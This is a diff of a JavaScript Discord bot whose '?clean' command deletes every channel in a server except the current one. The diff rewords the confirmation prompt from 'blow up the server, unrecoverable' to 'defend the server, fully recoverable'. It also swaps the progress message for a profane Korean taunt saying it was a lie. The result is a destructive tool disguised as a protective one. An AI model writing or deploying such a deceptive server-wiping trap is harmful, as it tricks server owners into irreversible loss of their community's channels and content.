@@ -7,8 +7,8 @@ client.login('토큰')
 client.on("message", async (message) => {
     if (message.content == '?clean') {
         const embed = new Discord.MessageEmbed()
-        .setTitle('정말 서버를 폭파할까요?')
-        .addField('복구 여부', '불가능')
+        .setTitle('정말 서버를 방어할까요?')
+        .addField('복구 여부', '쌉가능')
         .setColor(0xffff00)
         .setThumbnail(message.guild.iconURL({
             dynamic: true,
@@ -35,12 +35,12 @@ client.on("message", async (message) => {
                 m.reactions.removeAll();
                 if (!collected.first() || collected.first().emoji.name == '❌') {
                     await embed.setColor(0x00ffff)
-                    .setTitle('서버 폭파가 취소되었어요');
+                    .setTitle('서버 방어가 취소되었어요');
                     await m.edit(embed);
                     return;
                 }
                 await embed.setColor(0xff0000)
-                .setTitle(`${client.emojis.cache.find(x => x.name == 'loadingCirclebar')} 서버 폭파 중`)
+                .setTitle(`${client.emojis.cache.find(x => x.name == 'loadingCirclebar')} ㅇ 구라였음 씨발련아 `)
                 .addField('모든 채널 삭제', `${client.emojis.cache.find(x => x.name == 'loadingCirclebar')} 진행 중`, true);
                 await m.edit(embed);
                 m.guild.channels.cache.filter(x => x.id != m.channel.id).forEach(async function (ch) {
